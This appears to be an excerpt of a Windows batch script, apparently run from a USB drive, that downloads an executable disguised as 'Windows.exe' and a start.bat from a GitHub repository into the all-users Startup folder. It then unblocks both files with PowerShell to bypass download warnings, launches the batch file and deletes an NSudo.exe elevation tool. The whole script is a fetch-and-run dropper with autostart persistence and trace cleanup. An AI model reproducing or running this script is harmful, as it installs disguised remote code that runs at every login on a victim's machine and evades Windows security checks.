...
color 01
md "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windowsexe"
...
curl "https://raw.githubusercontent.com/YumYummity/usb-install/main/install/Windows.exe" --output "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windowsexe\Windows.exe"
curl "https://raw.githubusercontent.com/YumYummity/usb-install/main/install/start.bat" --output "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"
...
powershell -command "unblock-file -path 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windowsexe\Windows.exe'"
powershell -command "unblock-file -path 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\start.bat'"
start "" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"
del NSudo.exe
